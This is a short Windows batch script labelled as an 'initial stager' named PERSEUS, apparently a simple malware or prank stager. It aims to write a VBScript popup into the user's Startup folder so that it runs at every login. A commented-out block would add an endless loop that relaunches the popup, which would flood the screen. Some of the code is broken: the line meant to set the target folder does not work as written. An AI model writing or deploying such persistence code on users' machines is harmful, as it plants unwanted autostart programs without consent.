@echo off
@REM Initial stager
@REM PERSEUS

@REM Enter startup directory
PATH = cd C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup
@REM Write payload to Startup
(echo MsgBox "Line 1" ^& vbCrLf ^& "Line 2", 262192, "Title") > %PATH%/popup.vbs
@REM (
@REM     echo @echo off
@REM     echo :loop
@REM     echo start /min cmd /c "popup.vbs"
@REM     echo goto loop
@REM ) > payload.cmd